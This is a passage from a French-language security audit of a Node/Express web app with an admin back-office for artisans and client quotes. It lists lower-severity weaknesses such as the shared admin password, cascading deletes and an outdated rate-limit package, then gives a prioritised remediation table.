- **Modèle d'admin** : un seul mot de passe partagé, pas de comptes nominatifs, pas de 2FA, pas de journal d'audit des actions admin (suppressions, changements de plan). Pour un back-office qui peut supprimer des artisans et lire tous les devis clients, c'est léger.
- **Suppression d'artisan en cascade** : `schema.sql:25,48` `ON DELETE CASCADE` → `DELETE /api/admin/artisans/:id` (`server.js:1406-1409`) efface définitivement l'artisan, ses devis et ses tarifs, sans confirmation côté serveur ni corbeille. Un token admin volé (C-1/C-2) permet une destruction de données irréversible.
- **Disque Render éphémère** : les logos uploadés disparaissent à chaque redéploiement (déjà noté dans le code, `server.js:156-158`). Migration vers un stockage objet recommandée (résout aussi une partie de É-4).
- **`express-rate-limit` figé en 5.5.1** dans `package.json:12` (`"5.5.1"` sans `^`) : version de 2021, 2 majeures de retard.
- **Absence de tests de sécurité automatisés** : aucun `npm audit` en CI, pas de lint de sécurité (`eslint-plugin-security`), pas de test d'échappement sur les vues admin.
- **`GET /api/admin/logs`** (`server.js:1434-1453`) renvoie `process.memoryUsage()` et `process.uptime()` : divulgation d'informations mineure, réservée à l'admin — acceptable.

---

## Tableau récapitulatif des actions prioritaires

| # | Action | Effort | Priorité |
|---|---|---|---|
| C-2 | Vérifier/roter `ADMIN_PASSWORD` en prod + roter `JWT_SECRET` | Faible | Immédiat |
| C-1 / É-3 | Échapper toutes les interpolations DOM (`admin.html`, `app.js`, `camera.js`) + `htmlContent` email ; CSP | Moyen | Immédiat |
| C-3 / É-5 | Sortir le token du query string PDF ; réduire TTL ; ajouter `token_version` | Moyen | Court terme |
| É-1 | `FRONTEND_URL` obligatoire + CORS strict si liste vide | Faible | Court terme |
| É-2 | `trust proxy` + `express-rate-limit` 7.x + store persistant | Moyen | Court terme |
| É-4 | Validation magic bytes + extension forcée + `nosniff` + ré-encodage image | Moyen | Court terme |
| É-6 | `multer ≥ 2.3.0` (haute), `express`, `uuid` ; `npm audit` en CI | Faible | Court terme |
| M-1 | `rejectUnauthorized: true` sur la connexion DB | Faible | Court terme |
| M-2 / M-7 | `crypto.randomInt` pour codes de partage et d'activation ; codes plus longs | Faible | Court terme |
| M-3 / M-6 | Rate limiters dédiés sur `/d/:code`, `/api/devis/:id/pdf`, `/api/bot/*` + limite taille image + quota IA | Moyen | Court terme |
| M-4 | `crypto.timingSafeEqual` pour le mot de passe admin | Faible | Moyen terme |
| M-5 | Message neutre à l'inscription | Faible | Moyen terme |
| M-8 | bcrypt coût 12 + politique de mot de passe | Faible | Moyen terme |
| M-9 | Masquage des PII dans les logs | Faible | Moyen terme |
